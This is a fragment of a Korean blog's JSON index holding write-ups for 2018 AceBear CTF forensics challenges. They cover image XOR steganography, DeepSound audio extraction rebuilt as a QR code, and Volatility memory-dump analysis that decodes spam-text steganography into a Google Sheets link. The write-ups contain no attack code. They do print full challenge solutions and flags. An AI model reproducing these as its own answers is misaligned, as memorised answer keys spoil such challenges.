class=\"n\">decode_imdata</span><span class=\"p\">(</span><span class=\"n\">im</span><span class=\"o\">.</span><span class=\"n\">getdata</span><span class=\"p\">()))</span><span class=\"o\">.</span><span class=\"n\">decode</span><span class=\"p\">(</span><span class=\"s\">'hex'</span><span class=\"p\">)</span>\n<span class=\"k\">print</span> <span class=\"n\">data</span>\n\n\n<span class=\"n\">im2</span> <span class=\"o\">=</span> <span class=\"n\">Image</span><span class=\"o\">.</span><span class=\"nb\">open</span><span class=\"p\">(</span><span class=\"s\">'tmp.png'</span><span class=\"p\">)</span>\n<span class=\"n\">data2</span> <span class=\"o\">=</span> <span class=\"s\">''</span><span class=\"o\">.</span><span class=\"n\">join</span><span class=\"p\">(</span><span class=\"n\">decode_imdata</span><span class=\"p\">(</span><span class=\"n\">im2</span><span class=\"o\">.</span><span class=\"n\">getdata</span><span class=\"p\">()))</span><span class=\"o\">.</span><span class=\"n\">decode</span><span class=\"p\">(</span><span class=\"s\">'hex'</span><span class=\"p\">)</span>\n<span class=\"k\">print</span> <span class=\"n\">data2</span>\n\n\n<span class=\"k\">print</span> <span class=\"s\">''</span><span class=\"o\">.</span><span class=\"n\">join</span><span class=\"p\">(</span><span class=\"nb\">chr</span><span class=\"p\">(</span><span class=\"nb\">ord</span><span class=\"p\">(</span><span class=\"n\">x</span><span class=\"p\">)</span><span class=\"o\">^</span><span class=\"nb\">ord</span><span class=\"p\">(</span><span class=\"n\">y</span><span class=\"p\">))</span> <span class=\"k\">for</span> <span class=\"p\">(</span><span class=\"n\">x</span><span class=\"p\">,</span><span class=\"n\">y</span><span class=\"p\">)</span> <span class=\"ow\">in</span> <span class=\"nb\">zip</span><span class=\"p\">(</span><span class=\"n\">data</span><span class=\"p\">,</span><span class=\"n\">data2</span><span class=\"p\">))</span>\n</code></pre></div></div>\n\n<div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>jsh05042@Macs-MacBook-Pro  ~/Desktop/CTF/2018_Acebear_CTF/Forensic:MISC/STEg\n python ./steg.py\n53:<span class=\"o\">)</span>~&gt;1&amp;v1z4hu\nOMG_YOU_BREAK_IT\nzStep1k_st3p1k!!\n</code></pre></div></div>\n\n<blockquote>\n  <p>솔직히, 맞추라고 낸 문제인가 애매하다.. Forensic이 아니라 그냥 MISC 느낌.. 어거지로 끼워 만든 문제 느낌이 너무 강하고, 쓸데 없는 삽질이 너무 많이 필요했다…;;</p>\n</blockquote>\n\n<p align=\"right\"><strong>AceBear{zStep1k_st3p1k!!}</strong></p>\n"
    } ,
  
    {
      "title"    : "[2018_AceBear_CTF] My idol(975)",
      "category" : "CTF2018_acebear",
      "tags"     : "Forensic, MISC, Qr, mp3, deepsound",
      "url"      : "/ctf/2018_acebear/2018/02/09/AceBear-CTF-My-idol-975/",
      "date"     : "2018-02-09 00:00:00 +0900",
      "content"   : "<h2 id=\"exercise\">Exercise</h2>\n<blockquote>\n  <p>Challenge Description: Trying to listen and maybe you know his name, and you’ll know one of his secret weapons . Something that he deleted from Michael Hansen may help you get in.\nDownload: Link\nAuthor: komang4130</p>\n</blockquote>\n\n<p><img src=\"/images/2018-02-09-AceBear-CTF-My-idol-975/exercise.png\" alt=\"\" /></p>\n<p align=\"center\">[그림] exercise</p>\n\n<h2 id=\"solution\">Solution</h2>\n\n<p>Download link 를 통해 받은 파일을 확인해보면, 하나의 ape 파일을 확인할 수 있다. (<code class=\"highlighter-rouge\">call_him.ape</code>)\n<img src=\"/images/2018-02-09-AceBear-CTF-My-idol-975/exiftool.png\" alt=\"\" /></p>\n<p align=\"center\">[그림] exiftool - call_him.ape</p>\n\n<p>audio/x-monkeys-audio 형식의 audio 파일이며, 재생이 가능하다. 재생을 해서, 들리는 소리를 들어보면 독백의 대사를 읊는 남자의 목소리를 확인할 수 있는데, 중간에 앨리엇이라는 단어를 듣고 예전에 봤던, <code class=\"highlighter-rouge\">Mr.Robot</code>이라는 미드에 나오는 대사 부분임을 알 수 있었다.</p>\n\n<p>일단, 문제로 주어진 binary가 audio 파일이기 떄문에, 생각해볼 수 있는 접근 방식은 morse, spectrum, steganography, funky file format 정도로 세웠다. morese는 특별한 연관 내용이 보이지 않아 넘겼고, spectrum을 확인했을 때, 아래와 같이 특별히 식별되는 정보는 보이지 않았다.\n<img src=\"/images/2018-02-09-AceBear-CTF-My-idol-975/spectrum.png\" alt=\"\" /></p>\n<p align=\"center\">[그림] check spectrum</p>\n\n<p>내부적으로 딱히, file format을 가지고 장난을 친 흔적도 안보이고, 엔트로피 확인했을 때, 튀는 구간도 보이지 않게 분포가 일정했다. MP3 openStego를 이용해, hiding 된 Text가 있는지 살펴보았으나 마찬가지로 유의미한 정보는 없었으며 audio와 관련된 Steganography 에 대해 좀 더 찾아볼 필요가 있었다.</p>\n<pre><code class=\"language-Bash\"> jsh05042@Macs-MacBook-Pro  ~/Desktop/CTF/2018_Acebear_CTF/Forensic:MISC/My idol\n binwalk ./call_him.ape\n\nDECIMAL       HEXADECIMAL     DESCRIPTION\n--------------------------------------------------------------------------------\n</code></pre>\n\n<p><img src=\"/images/2018-02-09-AceBear-CTF-My-idol-975/entrophy.png\" alt=\"\" /></p>\n<p align=\"center\">[그림] check entropy</p>\n\n<pre><code class=\"language-cmd\">C:\\Users\\jsh05042\\Desktop\\MP3Stego_1_1_18\\MP3Stego&gt;Decode.exe ./call_him.ape -X\nMP3StegoEncoder 1.1.17\nSee README file for copyright info\nInput file = './call_him.ape'  output file = './call_him.ape.pcm'\nWill attempt to extract hidden information. Output: ./call_him.ape.txt\nEnter a passphrase:\nConfirm your passphrase: ******\nEnter a passphrase: **********\nConfirm your passphrase: **********\nthe bit stream file ./call_him.ape is a BINARY file\nHDR: s=FFF, id=0, l=3, ep=off, br=B, sf=0, pd=1, pr=1, m=2, js=3, c=0, o=0, e=0\nalg.=MPEG-2 LSF, layer=III, tot bitrate=112, sfrq=22.1\nmode=dual-ch, sblim=32, jsbd=32, ch=2\n[Frame    0]Not enough main data to decode frame 0.  Frame discarded.\n[Frame    1]Got 24048 bits = 751 slots plus 16\n[Frame    2]Got 5336 bits = 166 slots plus 24\n[Frame    3]Got 8568 bits = 267 slots plus 24\n[Frame    4]Side info bad: block_type == 0 in split block.\n</code></pre>\n\n<p>Forensic wiki 에서 audio steganography 항목에 대해서 추가적으로 찾아보다, 아래와 같이 <code class=\"highlighter-rouge\">deepsound</code> 라는 항목에 대해 확인할 수 있었다. Audio 에 데이터를 숨기고, 이를 추출할 수 있는 Windows 용 Steganography 도구라고 명시되어 있는데 해당 도구를 찾아 이용해 보았다.\n<img src=\"/images/2018-02-09-AceBear-CTF-My-idol-975/deepsound.png\" alt=\"\" /></p>\n<p align=\"center\">[그림] Forensic wiki - deepsound</p>\n\n<p><code class=\"highlighter-rouge\">deepsound</code>를 설치하고, <code class=\"highlighter-rouge\">call_him.ape</code> 파일을 로드하니, 아래와 같이 password 요구 화면을 확인할 수 있었다.\n<img src=\"/images/2018-02-09-AceBear-CTF-My-idol-975/deepsound2.png\" alt=\"\" /></p>\n<p align=\"center\">[그림] deepsound</p>\n\n<p>Password 에 대해 고민하던 찰나, 풀이자가 워낙 적었는지 hint 로 주어진 항목에, “Can u find his wikia?”라는 문장이 있었고 Elliot의 wiki를 찾아볼 수 있었다. http://mrrobot.wikia.com/wiki/Elliot 에서 내용을 볼 수 있으며, password로 쓰일만한 단서가 무엇인가 찾아보던 중 전화번호를 하나 확인할 수 있었다. <code class=\"highlighter-rouge\">(212) 555-0179</code> –&gt; <code class=\"highlighter-rouge\">2125550179</code>로 password를 주었을 때, deepsound 로부터 hide data 를 식별할 수 있었다.\n<img src=\"/images/2018-02-09-AceBear-CTF-My-idol-975/deepsound4.png\" alt=\"\" />\n<img src=\"/images/2018-02-09-AceBear-CTF-My-idol-975/deepsound3.png\" alt=\"\" /></p>\n<p align=\"center\">[그림] deepsound - hide data &amp; extract data</p>\n\n<p>좀 문제가 풀리는가 했는데, 여기서 또 한번 난관을 맞았다.. extract 한 파일의 data 가 도통 뭔지 식별할 수가 없는 문제였다. 이쯤 되면, Forensic 문제로 치부하기엔 Steganography 하나만 인정 해줄수 있을 것 같다… 아래는 해당 decode extract file. 숫자가 나오는 구간, alphabet이 나오는 구간 이렇게 구분지어지는 것은 확인했으나 무슨 의미를 가지는지 전혀 감을 못잡던 찰나, 주최측에서 새로운 힌트를 게시해뒀더라..\n<img src=\"/images/2018-02-09-AceBear-CTF-My-idol-975/extractfile.png\" alt=\"\" />\n<img src=\"/images/2018-02-09-AceBear-CTF-My-idol-975/hint.png\" alt=\"\" /></p>\n<p align=\"center\">[그림] hint &amp; file data</p>\n\n<p>Base64가 아니며, Image file임을 알 수 있고, length, width를 잘 확인하고, charset, Black &amp; White가 주어져있다. hint를 보고난 뒤, File size를 보니 48620 bytes 이다. “220x220”, “221x221”을 했을 때, 48400 size가 나오는데, 해당 파일 크기와 상당히 유사한 값을 띄는 것을 확인하고는 가로 세로 길이가 220인 Image를 base 로 접근했다.</p>\n\n<p>이어서, 위 <code class=\"highlighter-rouge\">weird</code> 파일 data를 보면, 숫자 구간과 alphabet 구간으로 구분지어진 것을 확인할 수 있는데, <code class=\"highlighter-rouge\">Black &amp; White</code>라는 hint 가 주어졌으므로 offset data 가 숫자일 경우, 알파벳일 경우를 나눠 Black과 White 의 색을 표현하는 code를 짜보았다.</p>\n<div class=\"language-python highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"kn\">from</span> <span class=\"nn\">PIL</span> <span class=\"kn\">import</span> <span class=\"n\">Image</span>\n\n<span class=\"n\">img</span> <span class=\"o\">=</span> <span class=\"n\">Image</span><span class=\"o\">.</span><span class=\"n\">new</span><span class=\"p\">(</span> <span class=\"s\">'RGB'</span><span class=\"p\">,</span> <span class=\"p\">(</span><span class=\"mi\">220</span><span class=\"p\">,</span><span class=\"mi\">220</span><span class=\"p\">),</span> <span class=\"s\">\"black\"</span><span class=\"p\">)</span>\n<span class=\"n\">pixels</span> <span class=\"o\">=</span> <span class=\"n\">img</span><span class=\"o\">.</span><span class=\"n\">load</span><span class=\"p\">()</span>\n<span class=\"k\">with</span> <span class=\"nb\">open</span> <span class=\"p\">(</span><span class=\"s\">\"weird\"</span><span class=\"p\">,</span> <span class=\"s\">\"r\"</span><span class=\"p\">)</span> <span class=\"k\">as</span> <span class=\"n\">f</span><span class=\"p\">:</span>\n    <span class=\"n\">data</span><span class=\"o\">=</span><span class=\"n\">f</span><span class=\"o\">.</span><span class=\"n\">read</span><span class=\"p\">()</span><span class=\"o\">.</span><span class=\"n\">replace</span><span class=\"p\">(</span><span class=\"s\">'</span><span class=\"se\">\\n</span><span class=\"s\">'</span><span class=\"p\">,</span> <span class=\"s\">''</span><span class=\"p\">)</span>\n\n<span class=\"k\">for</span> <span class=\"n\">i</span> <span class=\"ow\">in</span> <span class=\"nb\">range</span><span class=\"p\">(</span><span class=\"n\">img</span><span class=\"o\">.</span><span class=\"n\">size</span><span class=\"p\">[</span><span class=\"mi\">0</span><span class=\"p\">]):</span>\n    <span class=\"k\">for</span> <span class=\"n\">j</span> <span class=\"ow\">in</span> <span class=\"nb\">range</span><span class=\"p\">(</span><span class=\"n\">img</span><span class=\"o\">.</span><span class=\"n\">size</span><span class=\"p\">[</span><span class=\"mi\">1</span><span class=\"p\">]):</span>\n        <span class=\"n\">pixels</span><span class=\"p\">[</span><span class=\"n\">i</span><span class=\"p\">,</span><span class=\"n\">j</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"p\">(</span><span class=\"mi\">0</span><span class=\"p\">,</span><span class=\"mi\">0</span><span class=\"p\">,</span><span class=\"mi\">0</span><span class=\"p\">)</span>\n<span class=\"n\">k</span> <span class=\"o\">=</span> <span class=\"mi\">0</span>\n<span class=\"k\">for</span> <span class=\"n\">i</span> <span class=\"ow\">in</span> <span class=\"nb\">range</span><span class=\"p\">(</span><span class=\"n\">img</span><span class=\"o\">.</span><span class=\"n\">size</span><span class=\"p\">[</span><span class=\"mi\">0</span><span class=\"p\">]):</span>\n    <span class=\"k\">for</span> <span class=\"n\">j</span> <span class=\"ow\">in</span> <span class=\"nb\">range</span><span class=\"p\">(</span><span class=\"n\">img</span><span class=\"o\">.</span><span class=\"n\">size</span><span class=\"p\">[</span><span class=\"mi\">1</span><span class=\"p\">]):</span>\n        <span class=\"k\">if</span> <span class=\"n\">k</span> <span class=\"o\">&lt;</span> <span class=\"nb\">len</span><span class=\"p\">(</span><span class=\"n\">data</span><span class=\"p\">):</span>\n            <span class=\"k\">if</span> <span class=\"n\">data</span><span class=\"p\">[</span><span class=\"n\">k</span><span class=\"p\">]</span> <span class=\"ow\">in</span> <span class=\"s\">'0123456789'</span><span class=\"p\">:</span>\n                <span class=\"n\">pixels</span><span class=\"p\">[</span><span class=\"n\">i</span><span class=\"p\">,</span><span class=\"n\">j</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"p\">(</span><span class=\"mi\">255</span><span class=\"p\">,</span><span class=\"mi\">255</span><span class=\"p\">,</span><span class=\"mi\">255</span><span class=\"p\">)</span>\n            <span class=\"k\">else</span><span class=\"p\">:</span>\n                <span class=\"n\">pixels</span><span class=\"p\">[</span><span class=\"n\">i</span><span class=\"p\">,</span><span class=\"n\">j</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"p\">(</span><span class=\"mi\">0</span><span class=\"p\">,</span><span class=\"mi\">0</span><span class=\"p\">,</span><span class=\"mi\">0</span><span class=\"p\">)</span>\n\n            <span class=\"n\">k</span> <span class=\"o\">=</span> <span class=\"n\">k</span> <span class=\"o\">+</span><span class=\"mi\">1</span>\n\n<span class=\"n\">img</span><span class=\"o\">.</span><span class=\"n\">save</span><span class=\"p\">(</span><span class=\"s\">\"./result.png\"</span><span class=\"p\">)</span>\n</code></pre></div></div>\n\n<p>몇번 시행착오 겪다가, 올바르게 뽑아낸 결과 파일을 확인해 보면, QR Code 임을 알 수 있으며 아래와 같다.</p>\n<div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code> jsh05042@Macs-MacBook-Pro  ~/Desktop/CTF/2018_Acebear_CTF/Forensic:MISC/My idol\n python my.py\n</code></pre></div></div>\n<p><img src=\"/images/2018-02-09-AceBear-CTF-My-idol-975/qr.png\" alt=\"\" /></p>\n<p align=\"center\">[그림] result - convert file</p>\n\n<p>qr Code 가 나오는데, 색을 굳이 반전 시키지 않아도 정상인식이 가능하다. 인식을 Mobile app으로 진행했으며, 결과 Flag를 확인할 수 있다.\n<img src=\"/images/2018-02-09-AceBear-CTF-My-idol-975/flag.jpeg\" alt=\"\" /></p>\n<p align=\"center\">[그림] QR - decode with mobile app</p>\n\n<p align=\"right\"><strong>AceBear{2512_Ng0\\`i_nh4\\`_r4_d3\\`!!!!k0_c00l}</strong></p>\n"
    } ,
  
    {
      "title"    : "[2018_AceBear_CTF] Memory (951)",
      "category" : "CTF2018_acebear",
      "tags"     : "Forensic, MISC, memory, spammer",
      "url"      : "/ctf/2018_acebear/2018/02/09/AceBear-CTF-Memory-951/",
      "date"     : "2018-02-09 00:00:00 +0900",
      "content"   : "<h2 id=\"exercise\">Exercise</h2>\n\n<blockquote>\n  <p>Download: Link\nauthor: f4k3r</p>\n</blockquote>\n\n<p><img src=\"/images/2018-02-09-AceBear-CTF-Memory-951/exercise.png\" alt=\"\" /></p>\n<p align=\"center\">[그림] exercise</p>\n\n<h2 id=\"solution\">Solution</h2>\n\n<p>Download link 를 통해 받은 파일을 확인해보면, memory dump raw 파일을 하나 확인할 수 있다. volatility를 이용해, imageinfo를 확인해보면 아래와 같은 imageinfo를 식별할 수 있다. (Windows7)</p>\n\n<div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>jsh05042@Macs-MacBook-Pro  ~/Desktop/CTF/2018_Acebear_CTF/Forensic:MISC/Memory\n vol <span class=\"nt\">-f</span> ./dump.raw imageinfo\nVolatility Foundation Volatility Framework 2.6\nINFO    : volatility.debug    : Determining profile based on KDBG search...\nWARNING : volatility.debug    : Overlay structure cpuinfo_x86 not present <span class=\"k\">in </span>vtypes\nWARNING : volatility.debug    : Overlay structure cpuinfo_x86 not present <span class=\"k\">in </span>vtypes\nWARNING : volatility.debug    : Overlay structure cpuinfo_x86 not present <span class=\"k\">in </span>vtypes\n          Suggested Profile<span class=\"o\">(</span>s<span class=\"o\">)</span> : Win7SP1x86_23418, Win7SP0x86, Win7SP1x86\n                     AS Layer1 : IA32PagedMemoryPae <span class=\"o\">(</span>Kernel AS<span class=\"o\">)</span>\n                     AS Layer2 : FileAddressSpace <span class=\"o\">(</span>/Users/Mac/Desktop/CTF/2018_Acebear_CTF/Forensic:MISC/Memory/dump.raw<span class=\"o\">)</span>\n                      PAE <span class=\"nb\">type</span> : PAE\n                           DTB : 0x185000L\n                          KDBG : 0x8292ec28L\n          Number of Processors : 1\n     Image Type <span class=\"o\">(</span>Service Pack<span class=\"o\">)</span> : 1\n                KPCR <span class=\"k\">for </span>CPU 0 : 0x8292fc00L\n             KUSER_SHARED_DATA : 0xffdf0000L\n           Image date and <span class=\"nb\">time</span> : 2018-01-18 02:45:02 UTC+0000\n     Image <span class=\"nb\">local </span>date and <span class=\"nb\">time</span> : 2018-01-18 04:45:02 +0200\n</code></pre></div></div>\n<p><br /></p>\n\n<p>memory dump에 관련된 문제가 나왔을 때, 나같은 경우에는 가장 먼저 이상 프로세스가 없는지 확인한다. 이후, 이상 프로세스가 식별되는 경우에 해당 프로세스에 대한 덤프, 분석 등을 시도하며 별도로 이상한 프로세스가 식별되지 않을 경우 Command line, Registry, Shellbag 등 부가적인 정보, Network, Filelist 등에 대해 분석하는 식으로 보통 접근하는데 이번에도 앞서 언급한 행위 분석을 하는 과정 중 Filescan 에서 Document directory내에 아래와 같은 파일 목록을 확인할 수 있었다.</p>\n\n<p><img src=\"/images/2018-02-09-AceBear-CTF-Memory-951/filescan.png\" alt=\"\" /></p>\n<p align=\"center\">[그림] filescan list</p>\n\n<p>식별되는 <code class=\"highlighter-rouge\">\\Device\\HarddiskVolume2\\Users\\Administrator\\Documents</code> 내에서 확인되는 파일 목록 중 특이한 부분은 아래와 같다. 5개의 파일이 Document 폴더 내에 존재하는 것을 확인할 수 있는데 각각 rtf 파일 2개, python 파일 1개, gif 파일 1개, pdf 파일 1개이다.</p>\n\n<div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>0x000000001e0ed5d0      8      0 R--rwd <span class=\"se\">\\D</span>evice<span class=\"se\">\\H</span>arddiskVolume2<span class=\"se\">\\U</span>sers<span class=\"se\">\\A</span>dministrator<span class=\"se\">\\D</span>ocuments<span class=\"se\">\\d</span>ocument.rtf\n0x000000001fcaca30      8      0 R--rwd <span class=\"se\">\\D</span>evice<span class=\"se\">\\H</span>arddiskVolume2<span class=\"se\">\\U</span>sers<span class=\"se\">\\A</span>dministrator<span class=\"se\">\\D</span>ocuments<span class=\"se\">\\u</span>sb_command.rtf\n0x000000001fcbc4c8      7      0 R--r-d <span class=\"se\">\\D</span>evice<span class=\"se\">\\H</span>arddiskVolume2<span class=\"se\">\\U</span>sers<span class=\"se\">\\A</span>dministrator<span class=\"se\">\\D</span>ocuments<span class=\"se\">\\G</span>IF.gif\n0x000000001fccbf80      8      0 R--rwd <span class=\"se\">\\D</span>evice<span class=\"se\">\\H</span>arddiskVolume2<span class=\"se\">\\U</span>sers<span class=\"se\">\\A</span>dministrator<span class=\"se\">\\D</span>ocuments<span class=\"se\">\\h</span>ackerrank.py\n0x000000001ff241d8      8      0 R--rwd <span class=\"se\">\\D</span>evice<span class=\"se\">\\H</span>arddiskVolume2<span class=\"se\">\\U</span>sers<span class=\"se\">\\A</span>dministrator<span class=\"se\">\\D</span>ocuments<span class=\"se\">\\E</span>thical Hacking.pdf\n</code></pre></div></div>\n<p><br /></p>\n\n<p><code class=\"highlighter-rouge\">dumpfiles</code> command를 이용해, 해당 offset을 가지는 파일들을 추출해내는 작업을 수행함으로써 직접 각각의 파일을 확인할 수 있다. (Python 파일은 명시된 offset 값으로 바로 추출이 되지 않았지만, 문제 푸는데에는 지장이 없었으며 이 또한 MFT Entry offset을 참조하여 추출해낼 수는 있다.)</p>\n\n<div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>10516  vol <span class=\"nt\">-f</span> ./dump.raw <span class=\"nt\">--profile</span><span class=\"o\">=</span>Win7SP1x86_23418 dumpfiles <span class=\"nt\">-Q</span> 0x000000001e0ed5d0 <span class=\"nt\">-D</span> ./\n10517  vol <span class=\"nt\">-f</span> ./dump.raw <span class=\"nt\">--profile</span><span class=\"o\">=</span>Win7SP1x86_23418 dumpfiles <span class=\"nt\">-Q</span> 0x000000001fcaca30 <span class=\"nt\">-D</span> ./\n10518  vol <span class=\"nt\">-f</span> ./dump.raw <span class=\"nt\">--profile</span><span class=\"o\">=</span>Win7SP1x86_23418 dumpfiles <span class=\"nt\">-Q</span> 0x000000001fcbc4c8 <span class=\"nt\">-D</span> ./\n10519  vol <span class=\"nt\">-f</span> ./dump.raw <span class=\"nt\">--profile</span><span class=\"o\">=</span>Win7SP1x86_23418 dumpfiles <span class=\"nt\">-Q</span> 0x000000001fccbf80 <span class=\"nt\">-D</span> ./\n10522  vol <span class=\"nt\">-f</span> ./dump.raw <span class=\"nt\">--profile</span><span class=\"o\">=</span>Win7SP1x86_23418 dumpfiles <span class=\"nt\">-Q</span> 0x000000001ff241d8 <span class=\"nt\">-D</span> ./\n</code></pre></div></div>\n<p><br /></p>\n\n<p>document.rtf 내용은 아래와 같다. mail로 보이는 내용이 기록되어 있음을 알 수 있다. (아래쪽에서 언급하겠지만, 이 document.rtf 내용이 문제를 푸는 실마리였다.)</p>\n<div class=\"highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>Dear Colleague , Your email address has been submitted\nto us indicating your interest in our briefing ! If\nyou are not interested in our publications and wish\nto be removed from our lists, simply do NOT respond\nand ignore this mail . This mail is being sent in compliance\nwith Senate bill 2516 , Title 3 , Section 305 . THIS\nIS NOT MULTI-LEVEL MARKETING ! Why work for somebody\nelse when you can become rich in 48 DAYS ! Have you\never noticed more people than ever are surfing the\nweb and the baby boomers are more demanding than their\nparents . Well, now is your chance to capitalize on\nthis ! WE will help YOU turn your business into an\nE-BUSINESS &amp; decrease perceived waiting time by 180%\n! You can begin at absolutely no cost to you . But\ndon't believe us . Mrs Jones who resides in Rhode Island\ntried us and says \"I was skeptical but it worked for\nme\" ! This offer is 100% legal ! So make yourself rich\nnow by ordering immediately ! Sign up a friend and\nyou'll get a discount of 50% . Thank-you for your serious\nconsideration of our offer ! Dear Salaryman ; Thank-you\nfor your interest in our briefing ! If you no longer\nwish to receive our publications simply reply with\na Subject: of \"REMOVE\" and you will immediately be\nremoved from our club ! This mail is being sent in\ncompliance with Senate bill 1627 ; Title 1 ; Section\n301 . This is a ligitimate business proposal ! Why\nwork for somebody else when you can become rich as\nfew as 48 weeks ! Have you ever noticed more people\nthan ever are surfing the web plus nearly every commercial\non television has a .com on in it . Well, now is your\nchance to capitalize on this . We will help you increase\ncustomer response by 110% and turn your business into\nan E-BUSINESS ! You are guaranteed to succeed because\nwe take all the risk . But don't believe us . Prof\nSimpson of Pennsylvania tried us and says \"I was skeptical\nbut it worked for me\" ! We assure you that we operate\nwithin all applicable laws . So make yourself rich\nnow by ordering immediately . Sign up a friend and\nyou'll get a discount of 80% ! Thanks ! Dear Friend\n; This letter was specially selected to be sent to\nyou ! We will comply with all removal requests ! This\nmail is being sent in compliance with Senate bill 1623\n; Title 9 ; Section 303 . THIS IS NOT MULTI-LEVEL MARKETING\n. Why work for somebody else when you can become rich\nwithin 81 DAYS . Have you ever noticed how many people\nyou know are on the Internet plus nobody is getting\nany younger . Well, now is your chance to capitalize\non this ! We will help you process your orders within\nseconds and use credit cards on your website ! You\ncan begin at absolutely no cost to you . But don't\nbelieve us . Mrs Anderson of Colorado tried us and\nsays \"My only problem now is where to park all my cars\"\n! This offer is 100% legal ! Do not go to sleep without\nordering ! Sign up a friend and you get half off .\nWarmest regards ! Dear Business person , We know you\nare interested in receiving cutting-edge info ! If\nyou no longer wish to receive our publications simply\nreply with a Subject: of \"REMOVE\" and you will immediately\nbe removed from our club ! This mail is being sent\nin compliance with Senate bill 1623 ; Title 5 , Section\n308 ! This is NOT unsolicited bulk mail . Why work\nfor somebody else when you can become rich inside 23\nDAYS ! Have you ever noticed nobody is getting any\nyounger and society seems to be moving faster and faster\n. Well, now is your chance to capitalize on this !\nWE will help YOU deliver goods right to the customer's\ndoorstep and use credit cards on your website ! You\nare guaranteed to succeed because we take all the risk\n. But don't believe us ! Ms Anderson of Montana tried\nus and says \"Now I'm rich, Rich, RICH\" ! We are a BBB\nmember in good standing ! If not for you then for your\nloved ones - act now . Sign up a friend and you'll\nget a discount of 80% . Best regards .\n</code></pre></div></div>\n<p><br /></p>\n\n<p>usb_command.rtf 내용은 아래와 같다. flag format 의 문자열 텍스트가 일부 기록되어 있는 것을 확인하고는, 너무 쉽게 flag를 찾은게 아닌가 생각했지만 역시나 flag는 아니다. 딱히, 문자열 중에 기록된 pcap 파일이 file list 내에 있는가 찾아보았지만 식별되지는 않았고, 그다지 중요하지 않은 데이터였다.</p>\n<div class=\"highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>tshark -r data.pcapng -T fields -e usb.capdata &gt; data2.txt  //trich xuat du lieu goi tin\n\ntshark -r data.pcap -V  // xem can goi tin\n\ntshark -r data.pcap -V | grep “Left”    // xem phan du lieu goi tin\n\nflag[pr355-0nwards-3a10134e]c\n\nflag[pr355_0nwards_3a10134e]\n\nflag[pr355_0nwards_deafcb32]\n\nFLAG{PR#%%_)NWARDS_#A!)!#$E}C\n\n\n09 f F\n0f l L\n04 a A\n0a g G\n2f [ {\n13 p P\n15 r R\n20 3 #\n22 5 %\n22 5 %\n2d - _\n27 0 )\n11 n N\n1a w W\n04 a A\n15 r R\n07 d D\n16 s S\n2d - _\n20 3 #\n04 a A\n1e 1 !\n27 0 )\n1e 1 !\n20 3 #\n21 4 $\n08 e E\n30 ] }\n\n01\n010006 c C\n</code></pre></div></div>\n<p><br /></p>\n\n<p>GIF 파일은 아래 이미지와 같은데, 여러 장에 기록된 GIF 를 단일 이미지로 분할하여 모두 쭉 살펴보았지만 특별히 건질만한 항목은 없었다.\n<img src=\"/images/2018-02-09-AceBear-CTF-Memory-951/GIF.gif\" alt=\"\" /></p>\n<p align=\"center\">[그림] GIF.gif</p>\n\n<p>Ethical Hacking.pdf 파일내 분명 flag와 관련된 항목이 있을거라 생각했고, Embedded pdf 에 초점을 맞춰 분석했다. peepdf를 이용해 pdf 분석을 하였으며, 아래 초기 info 를 보더라도 의심되는 항목은 검출되지 않았다. 그럼에도 stream, object를 하나씩 쭉 살펴보았지만 역시 아무것도 도움이 되는 내용은 존재하지 않았다..\n<img src=\"/images/2018-02-09-AceBear-CTF-Memory-951/peepdf.png\" alt=\"\" /></p>\n<p align=\"center\">[그림] peepdf with Ethical Hacking.pdf</p>\n\n<p>이번 CTF는 HackXore 친구들과 5명 정도 같이했는데 모두 외쿡인 친구들이었다. 내가 살펴본 Task 들에 대해서 알렸고, hint가 주어졌다. steganography라는 힌트가 주어졌으며, 팀원 중 한명이 document.rtf 의 내용이 Spam Message 내에 정보를 은닉시키는 steganography 기술이 적용된 것 같다는 말을 해주었다. <code class=\"highlighter-rouge\">http://www.spammimic.com/decode.shtml</code>에서 spam message 에 대해 decode 작업을 수행할 수 있었으며, decode 결과 url hash 값으로 보여지는 text 를 얻을 수 있었다.\n<img src=\"/images/2018-02-09-AceBear-CTF-Memory-951/spamdecode.png\" alt=\"\" /></p>\n<p align=\"center\">[그림] spam mimic decode</p>\n\n<p>Decode Message result : <code class=\"highlighter-rouge\">1gwiPCJHiIrnZAwLB9q9ztZKrD9tbq65YnoZzXALnh6c</code></p>\n<ul>\n  <li>url hash format 으로 보여지는 해당 Decode 값을 가지고 문제를 어떻게 해결해야 생각하던 찰나, Memory dump 내에서 url 목록을 모두 뽑아보기로 했다. bulk extrator 를 이용해, 해당 Memory내에 존재하는 url histogram 등을 뽑으면서 동시에, strings &amp; grep 조합으로 문자열 탐색을 하다가 <code class=\"highlighter-rouge\">form</code>이라는 hint가 나왔고, memory dump 내 url 목록들 중, google drive 문서에서 비슷한 format 을 가지는 형태가 나오는 것을 확인할 수 있었다.\n<img src=\"/images/2018-02-09-AceBear-CTF-Memory-951/url.png\" alt=\"\" /></li>\n</ul>\n<p align=\"center\">[그림] url format</p>\n\n<p>이후, 개인 계정에서 Gdrive 문서들을 하나씩 열어보면서 Form을 확인했고, 아래와 같은 Form을 가지고 있는 것을 확인할 수 있었다.\n<img src=\"/images/2018-02-09-AceBear-CTF-Memory-951/form.png\" alt=\"\" />\n<img src=\"/images/2018-02-09-AceBear-CTF-Memory-951/form2.png\" alt=\"\" /></p>\n<p align=\"center\">[그림] google drive url form</p>\n\n<p>docement, spreadsheet 등의 url parameter에 해당 Decode Message 결과를 대입하던 중, 아래와 같이 <code class=\"highlighter-rouge\">spread sheet format</code>에서 공개된 문서를 열람할 수 있었으며, 해당 스프레드 시트 내에는 Flag가 기록되어 있었다.</p>\n\n<blockquote>\n  <p>result url\nhttps://docs.google.com/spreadsheets/d/1gwiPCJHiIrnZAwLB9q9ztZKrD9tbq65YnoZzXALnh6c/edit#gid=0</p>\n</blockquote>\n\n<p><img src=\"/images/2018-02-09-AceBear-CTF-Memory-951/flag.png\" alt=\"\" /></p>\n<p align=\"center\">[그림] 스프레드시트 flag</p>\n<p 